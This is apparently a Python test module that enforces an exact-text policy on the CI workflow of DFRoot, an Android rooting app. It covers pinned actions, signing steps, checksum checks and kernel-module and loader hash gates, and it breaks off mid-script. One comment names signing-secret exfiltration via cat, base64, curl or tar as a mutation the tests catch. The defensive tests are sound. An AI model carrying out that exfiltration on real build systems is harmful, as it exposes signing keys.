#!/usr/bin/env python3
"""Fast, dependency-free contract tests for .github/workflows/build.yml.

The parser in this module is a deliberately strict *allowlist* for the small
block-style YAML subset the workflow is allowed to use.  It is not a forgiving
YAML implementation: quoted keys, flow collections, anchors/aliases/tags,
heredocs in run scripts, stray secrets tokens and tolerated failures are all
hard errors.  That keeps a reviewer mutation (e.g. turning `uses:` into
`"uses":`, hiding a command behind a here-doc, or commenting out a check) from
silently passing the policy suite.

Behavioral tests extract the real `run:` scripts from the workflow and execute
them against temporary fixtures, including a fake Android SDK whose `apksigner`
records its arguments and can fail on demand.  A no-op mutation therefore fails
both the structural and the behavioral checks.

Standard library only; no PyYAML dependency in CI.
"""

from __future__ import annotations

import hashlib
import os
import re
import shutil
import subprocess
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = ROOT / ".github" / "workflows" / "build.yml"
TAG_PUSH = "github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')"
SIGNING_SECRETS = {"KEYSTORE", "KEYSTORE_PASSWORD", "KEY_ALIAS", "KEY_PASSWORD"}
ACTION_PINS = {
    "actions/checkout": ("3d3c42e5aac5ba805825da76410c181273ba90b1", "v7"),
    "actions/upload-artifact": ("cf430e030ddbb5b0abf93d22962f4752f3646cd9", "v7"),
    "actions/download-artifact": ("37930b1c2abaa49bbe596cd826c3c89aef350131", "v7"),
    "actions/setup-java": ("d1374f8ac74474200d16ef8ecee22c7ae7a51880", "v6"),
    "gradle/actions/setup-gradle": ("8da46b539cd8fe6ab27ca75128919a18d757604c", "v6"),
    "softprops/action-gh-release": ("8a0cd651e5b2365bd640854a3fa5dfc70e4875f3", "v3"),
}
ALLOWED_SECRETS = {"${{ secrets." + name + " }}" for name in SIGNING_SECRETS}
# Exact digest of the single digest-pinned DDK image used by build-lkms and by
# the local podman build (scripts/ddk-image.sh).  A floating tag or a different
# digest is a supply-chain change and must fail the policy suite.
DDK_IMAGE_DIGEST = "9e68cd9fcab748584755d31ba88ef134efc938dbde17f258c2652315f6cd81cd"
# Closed allowlist for the top-level `on:` triggers.  `pull_request_target` is
# deliberately absent: it would expose secrets/fork-controlled workflow context.
EXPECTED_TRIGGERS: dict[str, object] = {
    "push": {"branches": ["master", "main"], "tags": ["v*"]},
    "pull_request": {"branches": ["master", "main"]},
    "workflow_dispatch": {},
}
TEST_CI_COMMANDS = {
    "Run signing regression tests": "bash tests/signing/run_tests.sh",
    "Run signed and unsigned release smoke": 'bash tests/signing/smoke_signed_release.sh "$HOME"',
    "Run workflow policy tests": "python3 tests/workflow/test_policy.py",
    "Run make contract tests": "python3 -B tests/make/test_make.py",
}
APK_COUNTER_COMMAND = "Verify APK counts"
ANCESTRY_STEP = "Verify tag is on master"
CLEANUP_STEP = "Clean up signing material"
HOST_GATES_JOB = "host-gates"
CHECKOUT_SHA_STEP = "Assert checked-out SHA"
CHECKOUT_SHA_SCRIPT = (
    "set -euo pipefail\n"
    "head=$(git rev-parse 'HEAD^{commit}')\n"
    'if [ "$head" != "$GITHUB_SHA" ]; then\n'
    '  echo "::error::git HEAD $head != GITHUB_SHA $GITHUB_SHA"\n'
    "  exit 1\n"
    "fi\n"
    'echo "Checked out exactly $GITHUB_SHA"'
)
# PR #3 gate step names.  These are exact allowlist entries, not descriptive
# prose: renaming or reordering any of them fails the policy suite.
HOST_STATUS_STEP = "Host status-protocol tests"
KO_POLICY_TEST_STEP = "KO hash policy tests (CMake, host-only)"
PACKAGED_KO_TEST_STEP = "Packaged-KO byte-gate tests (CMake, host-only)"
APK_FIXTURE_TEST_STEP = "APK packaging gate fixture tests (CMake, host-only)"
EXTRACT_PINS_STEP = "Extract reviewed KO pins and sizes"
KO_CI_POLICY_STEP = "KO hash policy (CI enforced, skip rejected)"
JVM_TEST_STEP = "Java preference-persistence unit tests"
JUNIT_STEP = "Assert JUnit XML (39 tests, 0 failures)"
ALL_MARKERS_STEP = "Assert all test suites reached"
DEBUG_BUILD_STEP = "Build debug APK (compile/content gate only)"
CI_CACHE_ASSERT_STEP = "Assert KO hash check enabled in every CMakeCache"
CI_SCOPE_STEP = "Report CI evidence-only artifact scope"
CI_UPLOAD_STEP = "Upload DFRoot-CI evidence"
PACKAGED_KO_GATE_STEP = "Verify packaged KO bytes in every distributable APK"
APK_LOADER_GATE_STEP = "Verify bundled loader bytes in every distributable APK"
PROVENANCE_IDENTITY_STEP = "Verify build-provenance identity for every record"
RELEASE_EVIDENCE_STEP = "Verify release evidence for every uploaded APK"
UPLOAD_CHOKE_STEP = "Assert distributable evidence before upload"
RELEASE_UPLOAD_STEP = "Upload signed release"
PROVENANCE_GENERATE_STEP = "Generate APK provenance manifest (informational)"
PROVENANCE_UPLOAD_STEP = "Upload APK provenance manifest (informational)"
# The seven host suites that must each write a marker before the build may
# continue.  A green Gradle exit code alone is not enough to prove a suite ran.
HOST_SUITE_MARKERS = (
    "marker-native",
    "marker-ko-policy",
    "marker-packaged-ko",
    "marker-apk-packaging-fixture",
    "marker-ko-ci-policy",
    "marker-jvm",
    "marker-junit",
)
# Marker written by each required build-release gate; the pre-upload choke
# point refuses to publish unless every one exists and the index is populated.
RELEASE_GATE_MARKERS = (
    "marker-apk-gate",
    "marker-provenance-identity",
    "marker-release-evidence",
)
RELEASE_GATE_INDEX = "apk-gate-index.tsv"
APK_LOADER_GATE_INDEX = "apk-loader-index.tsv"
LOADER_PINS_FILE = "loader-pins.tsv"
# P2-15: AGP strips release JNI libs unless exempted; the two reviewed loader
# blobs must stay byte-identical for the P2-14 final-APK loader gate to pass.
LOADER_KEEP_DEBUG_SYMBOLS_FRAGMENTS = (
    'keepDebugSymbols += "**/libksud.so"',
    'keepDebugSymbols += "**/libksudnext.so"',
)
CI_EVIDENCE_ARTIFACT_NAME = "DFRoot-CI-evidence"
RELEASE_ARTIFACT_NAME = "DFRoot-release"
PROVENANCE_ARTIFACT_NAME = "DFRoot-provenance"
# Exact, ordered run-script contract for build-release.  Dict insertion order
# is the required order of the run steps.  Every value is the full, exact script
# text (no trailing newline, 2-space shell indentation), compared with equality
# by assert_exact_release_run_scripts.  Nothing is exempt -- cleanup included.
# An appended `cat signing.properties`, `base64`/`curl`/`tar` exfiltration,
# `|| true`, or a no-op `echo` replacement all change the text and fail.
ANCESTRY_SCRIPT = (
    "set -euo pipefail\n"
    "if ! git merge-base --is-ancestor HEAD origin/master; then\n"
    '  echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
    "  exit 1\n"
    "fi"
)
BUILD_SIGNED_SCRIPT = (
    "set -euo pipefail\n"
    "for attempt in 1 2 3; do\n"
    "  if ./gradlew :app:assembleRelease --no-daemon --console=plain; then\n"
    "    break\n"
    "  fi\n"
    "  if [[ $attempt -eq 3 ]]; then\n"
    '    echo "Gradle build failed after 3 attempts" >&2\n'
    "    exit 1\n"
    "  fi\n"
    '  echo "Gradle build failed (attempt $attempt), retrying in 30s..." >&2\n'
    "  sleep 30\n"
    "done"
)
VERIFY_SIGNED_SCRIPT = (
    "set -euo pipefail\n"
    "shopt -s nullglob\n"
    "apks=(app/build/outputs/apk/release/DFRoot_*.apk)\n"
    "if [[ ${#apks[@]} -ne 1 ]]; then\n"
    '  echo "Expected exactly one release APK, found ${#apks[@]}" >&2\n'
    "  exit 1\n"
    "fi\n"
    "sdk=${ANDROID_HOME:-${ANDROID_SDK_ROOT:-$HOME/Android/Sdk}}\n"
    "apksigner=\n"
    "if [[ -d $sdk/build-tools ]]; then\n"
    '  apksigner=$(find "$sdk/build-tools" -mindepth 2 -maxdepth 2 -type f -name apksigner -print | sort -V | tail -n 1)\n'
    "fi\n"
    'if [[ -z $apksigner || ! -x $apksigner ]]; then\n'
    '  echo "apksigner was not found in the Android SDK" >&2\n'
    "  exit 1\n"
    "fi\n"
    '"$apksigner" verify --verbose --print-certs "${apks[0]}"'
)
PACKAGE_SIGNED_SCRIPT = (
    "set -euo pipefail\n"
    "shopt -s nullglob\n"
    "apks=(app/build/outputs/apk/release/DFRoot_*.apk)\n"
    "if [[ ${#apks[@]} -ne 1 ]]; then\n"
    '  echo "Expected exactly one release APK, found ${#apks[@]}" >&2\n'
    "  exit 1\n"
    "fi\n"
    "apk=${apks[0]##*/}\n"
    "mkdir -p release\n"
    'cp -- "${apks[0]}" "release/$apk"\n'
    "cp -- GPL-3.0.txt LICENSE NOTICE THIRD_PARTY_NOTICES.md release/\n"
    "(\n"
    "  cd release\n"
    '  sha256sum -- "$apk" > "$apk.sha256"\n'
    ")"
)
CLEANUP_SCRIPT = (
    "rm -f -- signing.properties keystore.jks .keystore.jks-*.tmp .signing.properties-*.tmp"
)
# Exact, full run-script contract for the publisher's checksum verification.
# Equality (not a substring check) locks the manifest binding: the single line
# must be well formed, carry a lowercase digest with either the text `  ` or
# binary ` *` separator, and name exactly the selected release APK.  Digits are
# still checked against the APK bytes by `sha256sum --check` at the end.
VERIFY_CHECKSUM_SCRIPT = (
    "set -euo pipefail\n"
    "shopt -s nullglob\n"
    "checksums=(dist/DFRoot_*.apk.sha256)\n"
    "apks=(dist/DFRoot_*.apk)\n"
    "if [[ ${#checksums[@]} -ne 1 || ${#apks[@]} -ne 1 ]]; then\n"
    '  echo "Expected exactly one release APK and checksum" >&2\n'
    "  exit 1\n"
    "fi\n"
    "checksum=${checksums[0]##*/}\n"
    "apk=${apks[0]##*/}\n"
    'if [[ $checksum != "$apk.sha256" ]]; then\n'
    '  echo "Checksum filename does not match the release APK" >&2\n'
    "  exit 1\n"
    "fi\n"
    'mapfile -t checksum_lines < "dist/$checksum"\n'
    "if [[ ${#checksum_lines[@]} -ne 1 ]]; then\n"
    '  echo "Expected exactly one checksum line for the release APK" >&2\n'
    "  exit 1\n"
    "fi\n"
    "line=${checksum_lines[0]}\n"
    "if [[ ! $line =~ ^([0-9a-f]{64})('  '|' *')(.+)$ ]]; then\n"
    '  echo "Malformed checksum line for the release APK" >&2\n'
    "  exit 1\n"
    "fi\n"
    "manifest_name=${BASH_REMATCH[3]}\n"
    'if [[ $manifest_name != "$apk" ]]; then\n'
    '  echo "Checksum manifest filename does not match the release APK" >&2\n'
    "  exit 1\n"
    "fi\n"
    "(\n"
    "  cd dist\n"
    '  sha256sum --check "$checksum"\n'
    ")"
)

# Exact, ordered run-script contract for build-release (PR #1 + PR #3 gates).
# Every value is the full, exact script text (no trailing newline, 2-space shell
# indentation), compared with equality by assert_exact_release_run_scripts.
RELEASE_RUN_SCRIPTS: dict[str, str] = {
    'Verify tag is on master': (
        'set -euo pipefail\n'
        'if ! git merge-base --is-ancestor HEAD origin/master; then\n'
        '  echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
        '  exit 1\n'
        'fi'
    ),
    'Write signing material': (
        'java scripts/WriteSigningProperties.java ci .'
    ),
    'Build signed release APK': (
        'set -euo pipefail\n'
        'for attempt in 1 2 3; do\n'
        '  if ./gradlew :app:assembleRelease --no-daemon --console=plain; then\n'
        '    break\n'
        '  fi\n'
        '  if [[ $attempt -eq 3 ]]; then\n'
        '    echo "Gradle build failed after 3 attempts" >&2\n'
        '    exit 1\n'
        '  fi\n'
        '  echo "Gradle build failed (attempt $attempt), retrying in 30s..." >&2\n'
        '  sleep 30\n'
        'done'
    ),
    'Verify signed release APK': (
        'set -euo pipefail\n'
        'shopt -s nullglob\n'
        'apks=(app/build/outputs/apk/release/DFRoot_*.apk)\n'
        'if [[ ${#apks[@]} -ne 1 ]]; then\n'
        '  echo "Expected exactly one release APK, found ${#apks[@]}" >&2\n'
        '  exit 1\n'
        'fi\n'
        'sdk=${ANDROID_HOME:-${ANDROID_SDK_ROOT:-$HOME/Android/Sdk}}\n'
        'apksigner=\n'
        'if [[ -d $sdk/build-tools ]]; then\n'
        '  apksigner=$(find "$sdk/build-tools" -mindepth 2 -maxdepth 2 -type f -name apksigner -print | sort -V | tail -n 1)\n'
        'fi\n'
        'if [[ -z $apksigner || ! -x $apksigner ]]; then\n'
        '  echo "apksigner was not found in the Android SDK" >&2\n'
        '  exit 1\n'
        'fi\n'
        '"$apksigner" verify --verbose --print-certs "${apks[0]}"'
    ),
    'Package signed release APK': (
        'set -euo pipefail\n'
        'shopt -s nullglob\n'
        'apks=(app/build/outputs/apk/release/DFRoot_*.apk)\n'
        'if [[ ${#apks[@]} -ne 1 ]]; then\n'
        '  echo "Expected exactly one release APK, found ${#apks[@]}" >&2\n'
        '  exit 1\n'
        'fi\n'
        'apk=${apks[0]##*/}\n'
        'mkdir -p release\n'
        'cp -- "${apks[0]}" "release/$apk"\n'
        'cp -- GPL-3.0.txt LICENSE NOTICE THIRD_PARTY_NOTICES.md release/\n'
        '(\n'
        '  cd release\n'
        '  sha256sum -- "$apk" > "$apk.sha256"\n'
        ')'
    ),
    'Extract reviewed KO pins and sizes': (
        'set -euo pipefail\n'
        "sed -n '/set(KO_EXPECTED_SHA256S/,/^)/p' app/src/main/jni/CMakeLists.txt \\\n"
        '  | grep -oE \'[0-9a-f]{64}\' | paste -sd\';\' - > "$RUNNER_TEMP/ko-pins.txt"\n'
        "sed -n '/set(KO_EXPECTED_SIZES/,/^)/p' app/src/main/jni/CMakeLists.txt \\\n"
        '  | grep -oE \'[0-9]+\' | paste -sd\';\' - > "$RUNNER_TEMP/ko-sizes.txt"\n'
        'test -s "$RUNNER_TEMP/ko-pins.txt"\n'
        'test -s "$RUNNER_TEMP/ko-sizes.txt"\n'
        'echo "reviewed pins: $(cat "$RUNNER_TEMP/ko-pins.txt")"\n'
        'echo "reviewed sizes: $(cat "$RUNNER_TEMP/ko-sizes.txt")"'
    ),
    'Verify packaged KO bytes in every distributable APK': (
        'set -euo pipefail\n'
        'STAGE="$RUNNER_TEMP/dfroot-release-apks"\n'
        'INDEX="$RUNNER_TEMP/apk-gate-index.tsv"\n'
        'rm -rf "$STAGE"\n'
        'mkdir -p "$STAGE"\n'
        ': > "$INDEX"\n'
        'shopt -s nullglob\n'
        'APK_SOURCE=(release/DFRoot_*.apk)\n'
        'if [ "${#APK_SOURCE[@]}" -eq 0 ]; then\n'
        '  echo "::error::No packaged release APK found; refusing to publish unverified artifacts"\n'
        '  exit 1\n'
        'fi\n'
        'cp -- "${APK_SOURCE[@]}" "$STAGE/"\n'
        'STAGED=("$STAGE"/DFRoot_*.apk)\n'
        'if [ "${#STAGED[@]}" -ne "${#APK_SOURCE[@]}" ]; then\n'
        '  echo "::error::Staged APK count does not match the packaged release APK set"\n'
        '  exit 1\n'
        'fi\n'
        '\n'
        "# Prefer the NDK's llvm-objcopy: host binutils may not understand\n"
        '# AArch64 objects. Fall back to an llvm-objcopy/objcopy on PATH.\n'
        'OBJCOPY=""\n'
        'for candidate in \\\n'
        '    "${ANDROID_NDK_HOME:-}/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objcopy" \\\n'
        '    "${ANDROID_HOME:-}"/ndk/*/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objcopy; do\n'
        '  if [ -x "$candidate" ]; then OBJCOPY="$candidate"; break; fi\n'
        'done\n'
        'if [ -z "$OBJCOPY" ]; then\n'
        '  OBJCOPY="$(command -v llvm-objcopy || command -v objcopy || true)"\n'
        'fi\n'
        'if [ -z "$OBJCOPY" ]; then\n'
        '  echo "::error::No objcopy/llvm-objcopy available for the packaged-KO gate"\n'
        '  exit 1\n'
        'fi\n'
        '\n'
        'PINS=$(cat "$RUNNER_TEMP/ko-pins.txt")\n'
        'SIZES=$(cat "$RUNNER_TEMP/ko-sizes.txt")\n'
        'i=0\n'
        'for apk in "${STAGED[@]}"; do\n'
        '  i=$((i + 1))\n'
        '  name=$(basename "$apk")\n'
        '  apk_sha=$(sha256sum "$apk" | awk \'{print $1}\')\n'
        '  if [ "$(sha256sum "release/$name" | awk \'{print $1}\')" != "$apk_sha" ]; then\n'
        '    echo "::error::Staged APK $name differs from the packaged release APK"\n'
        '    exit 1\n'
        '  fi\n'
        '  # Required native content: the APK must carry the bootstrap\n'
        '  # library that ExploitRunner stages at runtime. Host-only zip\n'
        '  # assertion, not a device claim.\n'
        '  if ! unzip -Z1 "$apk" | grep -qx \'lib/arm64-v8a/libbootstrap.so\'; then\n'
        '    echo "::error::APK $name is missing lib/arm64-v8a/libbootstrap.so"\n'
        '    exit 1\n'
        '  fi\n'
        '  EXTRACT="$RUNNER_TEMP/apk-extract-$i"\n'
        '  rm -rf "$EXTRACT"\n'
        '  mkdir -p "$EXTRACT"\n'
        '  unzip -q "$apk" \'lib/arm64-v8a/libdfroot.so\' -d "$EXTRACT"\n'
        '  SO="$EXTRACT/lib/arm64-v8a/libdfroot.so"\n'
        '  test -f "$SO"\n'
        '  so_sha=$(sha256sum "$SO" | awk \'{print $1}\')\n'
        '\n'
        '  PMAN="$RUNNER_TEMP/dfroot-packaged-$i.manifest"\n'
        '  # The verifier invalidates its outputs at entry; repeat here so a\n'
        '  # reused runner-temp path can never carry stale verified evidence.\n'
        '  rm -f "$PMAN" "${PMAN}.dfroot_ko.dump"\n'
        '  cmake -DPACKAGED_SO="$SO" -DKO_OBJCOPY="$OBJCOPY" \\\n'
        '      "-DKO_EXPECTED_SHA256S=$PINS" "-DKO_EXPECTED_SIZE=$SIZES" \\\n'
        '      -DKO_MANIFEST="$PMAN" \\\n'
        '      -DDFROOT_SOURCE_DIR="$GITHUB_WORKSPACE" \\\n'
        '      -P app/src/main/jni/verify_packaged_ko.cmake\n'
        '  grep -q \'^status: verified$\' "$PMAN"\n'
        '  man_so_sha=$(sed -n \'s/^so_sha256: //p\' "$PMAN")\n'
        '  if [ "$man_so_sha" != "$so_sha" ]; then\n'
        '    echo "::error::Manifest so_sha256 for $name does not match the extracted .so"\n'
        '    exit 1\n'
        '  fi\n'
        "  printf '%s\\t%s\\t%s\\t%s\\t%s\\n' \\\n"
        '      "$name" "$apk_sha" "$so_sha" "$PMAN" "$man_so_sha" >> "$INDEX"\n'
        '  echo "verified APK: $name ($apk_sha)"\n'
        'done\n'
        'if [ ! -s "$INDEX" ]; then\n'
        '  echo "::error::APK gate index is empty; refusing to publish"\n'
        '  exit 1\n'
        'fi\n'
        'echo "apk-gate-ok" > "$RUNNER_TEMP/marker-apk-gate"'
    ),
    'Verify bundled loader bytes in every distributable APK': (
        'set -euo pipefail\n'
        '# Each pin must occur exactly once and be well formed in CMakeLists.txt.\n'
        'PINS="$RUNNER_TEMP/loader-pins.tsv"\n'
        'CMAKE_LIST=app/src/main/jni/CMakeLists.txt\n'
        ': > "$PINS"\n'
        'for spec in \\\n'
        "    'ksud_sha256|LOADER_KSUD_SHA256|^[0-9a-f]{64}$' \\\n"
        "    'ksud_size|LOADER_KSUD_SIZE|^[0-9]+$' \\\n"
        "    'ksudnext_sha256|LOADER_KSUDNEXT_SHA256|^[0-9a-f]{64}$' \\\n"
        "    'ksudnext_size|LOADER_KSUDNEXT_SIZE|^[0-9]+$'; do\n"
        '  field=${spec%%|*}\n'
        '  rest=${spec#*|}\n'
        '  key=${rest%%|*}\n'
        '  regex=${rest#*|}\n'
        '  value=$(sed -n "s/^set(${key}[[:space:]]\\{1,\\}\\"\\{0,1\\}\\([^\\")]*\\)\\"\\{0,1\\})[[:space:]]*\\$/\\1/p" "$CMAKE_LIST")\n'
        '  count=$(printf \'%s\\n\' "$value" | grep -c . || true)\n'
        '  if [ "$count" -ne 1 ] || [ -z "$value" ]; then\n'
        '    echo "::error::Expected exactly one well-formed $key pin in $CMAKE_LIST (found $count)"\n'
        '    exit 1\n'
        '  fi\n'
        '  if ! printf \'%s\\n\' "$value" | grep -Eq "$regex"; then\n'
        '    echo "::error::Malformed $key pin \'$value\' in $CMAKE_LIST"\n'
        '    exit 1\n'
        '  fi\n'
        '  printf \'%s\\t%s\\n\' "$field" "$value" >> "$PINS"\n'
        'done\n'
        'test -s "$PINS"\n'
        '\n'
        'STAGE="$RUNNER_TEMP/dfroot-release-apks"\n'
        'INDEX="$RUNNER_TEMP/apk-loader-index.tsv"\n'
        'rm -rf "$STAGE"\n'
        'mkdir -p "$STAGE"\n'
        ': > "$INDEX"\n'
        'shopt -s nullglob\n'
        'APK_SOURCE=(release/DFRoot_*.apk)\n'
        'if [ "${#APK_SOURCE[@]}" -eq 0 ]; then\n'
        '  echo "::error::No packaged release APK found; refusing to publish unverified artifacts"\n'
        '  exit 1\n'
        'fi\n'
        'cp -- "${APK_SOURCE[@]}" "$STAGE/"\n'
        'STAGED=("$STAGE"/DFRoot_*.apk)\n'
        'if [ "${#STAGED[@]}" -ne "${#APK_SOURCE[@]}" ]; then\n'
        '  echo "::error::Staged APK count does not match the packaged release APK set"\n'
        '  exit 1\n'
        'fi\n'
        '\n'
        'KSUD_SHA=$(awk -F \'\\t\' \'$1 == "ksud_sha256" { print $2; exit }\' "$PINS")\n'
        'KSUD_SIZE=$(awk -F \'\\t\' \'$1 == "ksud_size" { print $2; exit }\' "$PINS")\n'
        'NEXT_SHA=$(awk -F \'\\t\' \'$1 == "ksudnext_sha256" { print $2; exit }\' "$PINS")\n'
        'NEXT_SIZE=$(awk -F \'\\t\' \'$1 == "ksudnext_size" { print $2; exit }\' "$PINS")\n'
        'if [ -z "$KSUD_SHA" ] || [ -z "$KSUD_SIZE" ] || [ -z "$NEXT_SHA" ] || [ -z "$NEXT_SIZE" ]; then\n'
        '  echo "::error::Loader pins are incomplete"\n'
        '  exit 1\n'
        'fi\n'
        '\n'
        'field() {\n'
        '  awk -v key="$1" \'index($0, key ": ") == 1 {\n'
        '    print substr($0, length(key) + 3); exit }\' "$2"\n'
        '}\n'
        '\n'
        'i=0\n'
        'for apk in "${STAGED[@]}"; do\n'
        '  i=$((i + 1))\n'
        '  name=$(basename "$apk")\n'
        '  apk_sha=$(sha256sum "$apk" | awk \'{print $1}\')\n'
        '  if [ "$(sha256sum "release/$name" | awk \'{print $1}\')" != "$apk_sha" ]; then\n'
        '    echo "::error::Staged APK $name differs from the packaged release APK"\n'
        '    exit 1\n'
        '  fi\n'
        '  # Each loader must occur exactly once at its exact ABI path: a\n'
        '  # duplicate or alias would make the checked bytes ambiguous.\n'
        '  for entry in lib/arm64-v8a/libksud.so lib/arm64-v8a/libksudnext.so; do\n'
        '    count=$(unzip -Z1 "$apk" | grep -Fxc "$entry" || true)\n'
        '    count=${count:-0}\n'
        '    if [ "$count" -ne 1 ]; then\n'
        '      echo "::error::APK $name must contain exactly one \'$entry\' entry (found $count)"\n'
        '      exit 1\n'
        '    fi\n'
        '  done\n'
        '  EXTRACT="$RUNNER_TEMP/apk-loader-extract-$i"\n'
        '  rm -rf "$EXTRACT"\n'
        '  mkdir -p "$EXTRACT"\n'
        '  unzip -q "$apk" \'lib/arm64-v8a/libksud.so\' \'lib/arm64-v8a/libksudnext.so\' -d "$EXTRACT"\n'
        '  KSUD="$EXTRACT/lib/arm64-v8a/libksud.so"\n'
        '  NEXT="$EXTRACT/lib/arm64-v8a/libksudnext.so"\n'
        '  test -f "$KSUD"\n'
        '  test -f "$NEXT"\n'
        '  ksud_sha=$(sha256sum "$KSUD" | awk \'{print $1}\')\n'
        '  next_sha=$(sha256sum "$NEXT" | awk \'{print $1}\')\n'
        '\n'
        '  LMAN="$RUNNER_TEMP/dfroot-loader-$i.manifest"\n'
        '  LSTAMP="$RUNNER_TEMP/dfroot-loader-$i.verified"\n'
        '  # The verifier invalidates its outputs at entry; repeat here so a\n'
        '  # reused runner-temp path can never carry stale verified evidence.\n'
        '  rm -f "$LMAN" "$LSTAMP"\n'
        '  cmake \\\n'
        '      -DLOADER_KSUD_FILE="$KSUD" \\\n'
        '      -DLOADER_KSUDNEXT_FILE="$NEXT" \\\n'
        '      "-DLOADER_KSUD_SHA256=$KSUD_SHA" "-DLOADER_KSUD_SIZE=$KSUD_SIZE" \\\n'
        '      "-DLOADER_KSUDNEXT_SHA256=$NEXT_SHA" "-DLOADER_KSUDNEXT_SIZE=$NEXT_SIZE" \\\n'
        '      -DLOADER_VERIFY_STAMP="$LSTAMP" \\\n'
        '      -DLOADER_VERIFY_MANIFEST="$LMAN" \\\n'
        '      -P app/src/main/jni/verify_loader_hashes.cmake\n'
        '  grep -q \'^status: verified$\' "$LMAN"\n'
        '  if [ "$(field ksud_sha256 "$LMAN")" != "$KSUD_SHA" ] ||\n'
        '     [ "$(field ksud_size "$LMAN")" != "$KSUD_SIZE" ] ||\n'
        '     [ "$(field ksudnext_sha256 "$LMAN")" != "$NEXT_SHA" ] ||\n'
        '     [ "$(field ksudnext_size "$LMAN")" != "$NEXT_SIZE" ]; then\n'
        '    echo "::error::Loader manifest fields for $name do not match the reviewed pins"\n'
        '    exit 1\n'
        '  fi\n'
        '  if [ "$(field ksud_sha256 "$LMAN")" != "$ksud_sha" ] ||\n'
        '     [ "$(field ksudnext_sha256 "$LMAN")" != "$next_sha" ]; then\n'
        '    echo "::error::Loader manifest hashes for $name do not match the extracted entries"\n'
        '    exit 1\n'
        '  fi\n'
        "  printf '%s\\t%s\\t%s\\t%s\\t%s\\n' \\\n"
        '      "$name" "$apk_sha" "$ksud_sha" "$next_sha" "$LMAN" >> "$INDEX"\n'
        '  echo "verified loader bytes: $name ($apk_sha)"\n'
        'done\n'
        'if [ ! -s "$INDEX" ]; then\n'
        '  echo "::error::APK loader index is empty; refusing to publish"\n'
        '  exit 1\n'
        'fi'
    ),
    'Verify build-provenance identity for every record': (
        'set -euo pipefail\n'
        'bad=0\n'
        'records=0\n'
        'field() {\n'
        '  awk -v key="$1" \'index($0, key ": ") == 1 {\n'
        '    print substr($0, length(key) + 3); exit }\' "$2"\n'
        '}\n'
        'sha_of_recorded() {\n'
        '  case "$1" in\n'
        '    /*) path="$1" ;;\n'
        '    *)  path="$GITHUB_WORKSPACE/$1" ;;\n'
        '  esac\n'
        '  if [ -f "$path" ]; then\n'
        '    sha256sum "$path" | awk \'{print $1}\'\n'
        '  else\n'
        '    echo "unavailable"\n'
        '  fi\n'
        '}\n'
        "while IFS= read -r -d '' rec; do\n"
        '  records=$((records + 1))\n'
        '  rec_head=$(field git_head "$rec")\n'
        '  if [ "$rec_head" != "$GITHUB_SHA" ]; then\n'
        '    echo "::error::Provenance git_head \'$rec_head\' != GITHUB_SHA \'$GITHUB_SHA\' ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        '  rec_variant=$(field android_variant "$rec")\n'
        '  if [ "${rec_variant,,}" != "release" ]; then\n'
        '    echo "::error::Provenance android_variant is not release: \'$rec_variant\' ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        '  rec_ko=$(field ko_sha256 "$rec")\n'
        '  if ! tr \';\' \'\\n\' < "$RUNNER_TEMP/ko-pins.txt" | grep -qx "$rec_ko"; then\n'
        '    echo "::error::Provenance ko_sha256 \'$rec_ko\' is not a reviewed pin ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        '  rec_ko_man=$(field ko_verify_manifest "$rec")\n'
        '  rec_ko_man_sha=$(field ko_manifest_sha256 "$rec")\n'
        '  if [ "$(sha_of_recorded "$rec_ko_man")" != "$rec_ko_man_sha" ]; then\n'
        '    echo "::error::Provenance ko_manifest digest mismatch ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        '  rec_helper=$(field splicehelper_binary "$rec")\n'
        '  rec_helper_sha=$(field splicehelper_sha256 "$rec")\n'
        '  if [ "$(sha_of_recorded "$rec_helper")" != "$rec_helper_sha" ]; then\n'
        '    echo "::error::Provenance splicehelper binary hash mismatch ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        '  rec_helper_src=$(field splicehelper_source "$rec")\n'
        '  rec_helper_src_sha=$(field splicehelper_source_sha256 "$rec")\n'
        '  if [ "$(sha_of_recorded "$rec_helper_src")" != "$rec_helper_src_sha" ]; then\n'
        '    echo "::error::Provenance splicehelper source hash mismatch ($rec)"\n'
        '    bad=1\n'
        '  fi\n'
        '  for compiler_field in compiler_id compiler_version compiler_target \\\n'
        '                        compiler_sysroot compiler_c_flags compiler_asm_flags; do\n'
        '    if ! grep -q "^${compiler_field}: " "$rec"; then\n'
        '      echo "::error::Provenance missing ${compiler_field} ($rec)"\n'
        '      bad=1\n'
        '    elif [ -z "$(field "$compiler_field" "$rec")" ]; then\n'
        '      echo "::error::Provenance empty ${compiler_field} ($rec)"\n'
        '      bad=1\n'
        '    fi\n'
        '  done\n'
        "done < <(find app/.cxx -type f -name 'dfroot-build-provenance.txt' -print0 2>/dev/null)\n"
        'if [ "$records" -eq 0 ]; then\n'
        '  echo "::error::No dfroot-build-provenance.txt found; refusing to publish"\n'
        '  bad=1\n'
        'fi\n'
        'if [ "$bad" -ne 0 ]; then\n'
        '  echo "::error::Build-provenance identity checks failed; blocking upload/release"\n'
        '  exit 1\n'
        'fi\n'
        'echo "Verified $records provenance record(s)"\n'
        'echo "provenance-identity-ok" > "$RUNNER_TEMP/marker-provenance-identity"'
    ),
    'Assert KO hash check enabled in every CMakeCache': (
        'set -euo pipefail\n'
        'caches=$(find app/.cxx -type f -name CMakeCache.txt 2>/dev/null || true)\n'
        'if [ -z "$caches" ]; then\n'
        '  echo "::error::No CMakeCache.txt found under app/.cxx"\n'
        '  exit 1\n'
        'fi\n'
        'bad=0\n'
        'while IFS= read -r cache; do\n'
        '  if ! grep -qs \'^DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF$\' "$cache"; then\n'
        '    echo "::error::DFROOT_SKIP_KO_HASH_CHECK is not OFF in $cache"\n'
        '    bad=1\n'
        '  fi\n'
        'done <<< "$caches"\n'
        'if [ "$bad" -ne 0 ]; then\n'
        '  exit 1\n'
        'fi\n'
        'echo "DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF confirmed in all CMakeCache files"'
    ),
    'Verify release evidence for every uploaded APK': (
        'set -euo pipefail\n'
        'bad=0\n'
